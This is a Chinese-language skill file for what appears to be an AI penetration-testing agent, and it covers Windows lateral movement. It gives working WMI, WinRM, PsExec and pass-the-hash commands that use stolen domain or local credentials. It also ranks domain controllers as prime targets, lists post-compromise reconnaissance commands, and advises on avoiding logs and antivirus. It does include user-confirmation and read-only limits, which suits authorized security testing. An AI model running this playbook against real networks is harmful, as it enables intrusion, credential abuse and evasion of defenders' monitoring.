---
name: lateral-move-wmi-psexec
description: 利用已获取的 Windows 凭据（明文密码、NTLM Hash）通过 WMI、PsExec、WinRM 等协议横向移动到内网 Windows 主机。当目标环境为 Windows 域或工作组且已获取有效凭据时使用。
enabled: true
---

# Windows 横向移动（WMI / PsExec / WinRM）

当已获取 Windows 凭据（域账户密码、本地管理员密码、NTLM Hash）且内网存在 Windows 主机时，使用本 skill 尝试横向移动。

> 前置条件：需已完成 `hunt-credentials`（获取 Windows 凭据）和 `recon-internal-network`（识别 445/5985/135 端口存活主机）。

---

## 一、OPSEC 与约束

| 原则 | 说明 |
|---|---|
| 最小尝试 | 每个目标最多尝试 2 组凭据，避免触发账户锁定策略 |
| 协议选择 | 优先 WMI/WinRM（低痕迹），PsExec 作为回退（会落盘服务） |
| 不修改 | 不创建账户、不修改组策略、不安装持久化 |
| 不扩散 | 不在新主机自动继续横向，每跳需用户确认 |
| 日志意识 | 4624/4625 登录事件、7045 服务安装事件会被记录 |

**确认机制：**
- 首次横向尝试需要用户确认（高影响操作）
- PsExec 方式会在目标创建临时服务，需额外确认
- 成功后执行的命令默认只读

---

## 二、目标

- 验证已获取的 Windows 凭据在哪些内网主机上有效
- 确认登录后的权限级别（SYSTEM / 管理员 / 普通用户）
- 收集新立足点基础信息（OS 版本、域信息、网络、服务）
- 评估新立足点价值（域控、数据库服务器、跳板机）

---

## 三、Skill 元数据

- riskLevel: `high`
- accessMode: `active_exploit`
- requiredTools: `CommandTools`, `FileTools`
- optionalTools: `ScanTools`, `CredentialHarvestTools`
- produces: `lateralMovement.windowsAccess[]`, `lateralMovement.newFootholds[]`, `openQuestions`
- structuredPatchPaths: `lateralMovement.windowsAccess[]`, `lateralMovement.newFootholds[]`
- recommendedNextSkills: `recon-basic-info` (在新立足点), `hunt-credentials` (在新立足点), `escalate-windows-privilege`, `recon-active-directory`
- forbiddenByDefault: 创建账户、修改组策略、安装持久化、清除安全日志

---

## 四、工作流程

### 执行前：制定计划

在任何工具调用前，先输出：

1. **目标**：利用已获取的 Windows 凭据通过 WMI/PsExec/WinRM 横向移动到内网 Windows 主机。
2. **路径**：评估可用协议和工具 → 构建凭据-目标矩阵 → 按优先级尝试连接 → 执行只读侦察。
3. **终止条件**：成功建立新立足点，或所有高优先级目标均已尝试且失败时停止。

必须先读取侦察摘要，提取：
- `credentials.generic` — Windows 密码、NTLM Hash
- `networkProfile.liveHosts` — Windows 存活主机
- `serviceProfile.openPorts` — 开放 445/135/5985/5986 的主机

### 第一阶段：评估横向移动能力

确认当前 puppet 具备的横向能力：

```cmd
:: 检查可用工具
where wmic 2>nul
where powershell 2>nul
where psexec 2>nul
where winrs 2>nul

:: 确认当前身份和域信息
whoami /all
net config workstation
nltest /dclist: 2>nul

:: 确认 445/135/5985 端口连通性（对目标）
Test-NetConnection -ComputerName <target> -Port 445
```

**协议选择决策树：**

| 条件 | 推荐协议 | 理由 |
|---|---|---|
| 目标开放 5985 且有明文密码 | WinRM | 低痕迹，原生支持 |
| 目标开放 135 且有明文密码 | WMI | 不落盘，不创建服务 |
| 目标开放 445 且有密码/Hash | PsExec | 兼容性最强，但会创建服务 |
| 有 NTLM Hash 无明文 | PTH + WMI/PsExec | 需要支持 PTH 的工具 |

### 第二阶段：构建凭据-目标匹配矩阵

**凭据类型及适用协议：**

| 凭据类型 | 适用协议 | 使用方式 |
|---|---|---|
| 明文密码（域账户） | WMI / WinRM / PsExec | 直接认证 |
| 明文密码（本地管理员） | WMI / PsExec | 需加 /user:.\Administrator |
| NTLM Hash | PsExec (Impacket) | Pass-the-Hash |
| 当前 Token（已提权） | WMI / PsExec | 使用当前上下文 |

**目标排序优先级：**

| 优先级 | 条件 | 理由 |
|---|---|---|
| P0 | 域控（已知 DC） | 最高价值，可能获取全域凭据 |
| P1 | 数据库/文件服务器 | 高价值数据 |
| P2 | 同网段 + 445 开放 | 可能共享本地管理员密码 |
| P3 | 跨网段 Windows 主机 | 扩展网络覆盖 |

### 第三阶段：连接尝试（需用户确认）

#### WMI 方式（推荐，低痕迹）

```cmd
:: 使用 wmic 执行远程命令
wmic /node:<target> /user:<domain>\<user> /password:<pass> process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

:: 读取结果
type \\<target>\C$\Windows\Temp\out.txt
```

或通过 PowerShell：

```powershell
$cred = New-Object System.Management.Automation.PSCredential("<domain>\<user>", (ConvertTo-SecureString "<pass>" -AsPlainText -Force))
Invoke-WmiMethod -ComputerName <target> -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami & hostname & ipconfig /all > C:\Windows\Temp\recon.txt"
```

#### WinRM 方式（推荐，需 5985 端口）

```powershell
$cred = New-Object System.Management.Automation.PSCredential("<domain>\<user>", (ConvertTo-SecureString "<pass>" -AsPlainText -Force))
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {
    whoami; hostname; ipconfig /all; net localgroup administrators
}
```

或使用 winrs：

```cmd
winrs -r:<target> -u:<domain>\<user> -p:<pass> "whoami & hostname & ipconfig /all"
```

#### PsExec 方式（回退，会创建服务）

```cmd
:: 标准 PsExec（需确认：会在目标安装 PSEXESVC 服务）
psexec \\<target> -u <domain>\<user> -p <pass> cmd.exe /c "whoami & hostname & ipconfig /all"
```

**结果判断：**

| 输出 | 含义 | 下一步 |
|---|---|---|
| 身份信息返回 | 认证成功 | 进入第四阶段 |
| Access denied / 拒绝访问 | 凭据无效或权限不足 | 换凭据或目标 |
| RPC server unavailable | 目标不可达或服务未启用 | 换协议 |
| 账户已锁定 | 触发锁定策略 | 立即停止该账户所有尝试 |
| 网络路径不存在 | SMB 不可达 | 尝试 WinRM |

### 第四阶段：新立足点快速侦察（只读）

成功连接后执行单次侦察命令：

```cmd
:: 身份与权限
whoami /all
net localgroup Administrators

:: 系统信息
systeminfo | findstr /B /C:"OS" /C:"System" /C:"Domain" /C:"Hotfix"

:: 网络
ipconfig /all
route print
netstat -ano | findstr LISTENING

:: 域信息（如果在域中）
net user /domain 2>nul | head -20
nltest /dclist: 2>nul
net group "Domain Admins" /domain 2>nul

:: 服务
wmic service where "startmode='auto'" get name,startname,pathname | findstr /V /C:"C:\Windows"

:: 防护
wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName 2>nul
sc query WinDefend | findstr STATE
```

**评估维度：**

| 维度 | 高价值信号 |
|---|---|
| 身份 | 域管理员、本地 SYSTEM |
| 角色 | 域控、Exchange、SQL Server、文件服务器 |
| 网络 | 新网段、双网卡、VPN 接口 |
| 凭据 | 域管缓存、LSA Secrets 可提取 |
| 防护 | AV 未运行、EDR 缺失 |

---

## 五、工具优先级

| 优先级 | 工具 | 用途 |
|---|---|---|
| 1 | `CommandTools.exec` | 横向连接命令（WMI/WinRM/PsExec），timeout 20-30 秒 |
| 2 | `FileTools.readTextFile` | 读取远程输出文件（通过 UNC 路径） |
| 3 | `CommandTools.exec` | 快速检查工具可用性、端口连通性 |
| 4 | `ScanTools` | 补充确认目标端口状态 |

---

## 六、失败回退

| 场景 | 回退策略 |
|---|---|
| wmic 不可用 | 使用 PowerShell Invoke-WmiMethod |
| WinRM 未启用 | 回退到 WMI 或 PsExec |
| PsExec 不存在 | 使用 WMI 或 sc 远程创建服务 |
| 所有协议失败 | 检查防火墙规则、确认凭据正确性 |
| 账户锁定 | 立即停止，等待锁定期过后或换账户 |
| UAC 远程限制 | 本地管理员受 LocalAccountTokenFilterPolicy 限制，需域账户 |
| AV 拦截 PsExec | 改用 WMI 或 WinRM（无文件落盘） |
| 目标不在域中 | 使用 .\Administrator 本地账户格式 |

---

## 七、输出格式

```markdown
## Windows 横向移动摘要

**尝试目标数**：{n}
**成功连接数**：{n}
**新立足点数**：{n}
**使用协议**：{WMI / WinRM / PsExec}

---

## 凭据-目标匹配矩阵

| 目标 IP | 端口 | 协议 | 用户 | 凭据类型 | 结果 |
|---------|------|------|------|---------|------|
| 10.0.1.5 | 445 | WMI | CORP\admin | 明文密码 | 成功 |
| 10.0.1.10 | 5985 | WinRM | CORP\svc_sql | 明文密码 | 拒绝 |

## 成功立足点

### {IP} — {hostname}

- **协议**：{WMI / WinRM / PsExec}
- **登录用户**：{domain\user}
- **权限级别**：{SYSTEM / 管理员 / 普通用户}
- **操作系统**：{Windows Server 2019 / Windows 10}
- **域角色**：{域控 / 成员服务器 / 工作站}
- **新发现网段**：{new_cidrs or "无"}
- **关键服务**：{SQL Server / Exchange / IIS}
- **AV/EDR 状态**：{产品名 + 状态}
- **二次横向潜力**：{high / medium / low}
- **理由**：{assessment}

## 失败记录

| 目标 | 协议 | 失败原因 | 备注 |
|------|------|---------|------|

## 风险提示

- Windows 安全日志 Event ID 4624（成功登录）/ 4625（失败登录）
- PsExec 会触发 Event ID 7045（服务安装）
- {other_opsec_notes}

## 下一步建议

2~3 条建议
```

---

## 八、结构化摘要写入

完成后必须：

1. `manage_recon_summary(action="append")` — 记录横向结果、协议、权限级别
2. `manage_recon_summary(action="append")` — 合并机器可读字段

结构化 patch 示例：

```json
{
  "lateralMovement": {
    "windowsAccess": [
      {
        "target": "10.0.1.5",
        "port": 445,
        "protocol": "WMI",
        "user": "CORP\\admin",
        "credentialType": "password",
        "result": "success",
        "privilegeLevel": "administrator",
        "hostname": "DB-SERVER-01",
        "domainRole": "member_server",
        "os": "Windows Server 2019"
      }
    ],
    "newFootholds": [
      {
        "target": "10.0.1.5",
        "hostname": "DB-SERVER-01",
        "os": "Windows Server 2019",
        "privilegeLevel": "administrator",
        "domainRole": "member_server",
        "newCidrs": ["10.0.2.0/24"],
        "keyServices": ["MSSQL:1433", "IIS:80"],
        "avStatus": "Windows Defender - Running",
        "lateralPotential": "high",
        "reason": "管理员权限 + SQL Server + 新网段"
      }
    ]
  },
  "openQuestions": ["hunt-credentials (on 10.0.1.5)", "recon-active-directory"]
}
```

---

## 九、决策规则

| 场景 | 行为 |
|---|---|
| 无 Windows 凭据 | 终止，建议先执行 hunt-credentials |
| 无 445/135/5985 目标 | 终止，建议先执行 recon-internal-network |
| 首次横向尝试 | 必须用户确认 |
| PsExec 方式 | 需额外确认（会创建服务，痕迹大） |
| 账户连续失败 2 次 | 停止该账户所有尝试（防锁定） |
| 发现域控 | 最高优先级标记，但不自动攻击 |
| 目标有 EDR | 标注风险，建议用户评估是否继续 |
| 横向成功 | 立即执行侦察，不等待 |
| 凭据是域管 | 标记为最高价值，提示可直接访问域控 |

---

## 十、OPSEC 痕迹提示

| 协议 | 痕迹 |
|---|---|
| WMI | Event 4624 (Type 3) + WMI-Activity 日志 |
| WinRM | Event 4624 (Type 3) + WinRM Operational 日志 |
| PsExec | Event 4624 + Event 7045（服务安装）+ PSEXESVC.exe 落盘 |
| SMB | Event 5140/5145（共享访问）|
| 失败 | Event 4625（登录失败）— 多次可能触发告警 |

**降低痕迹建议：**
- 优先使用 WMI / WinRM，避免 PsExec
- 避免短时间内对同一目标多次认证失败
- 使用域账户而非本地账户（减少 UAC 限制和日志特征）
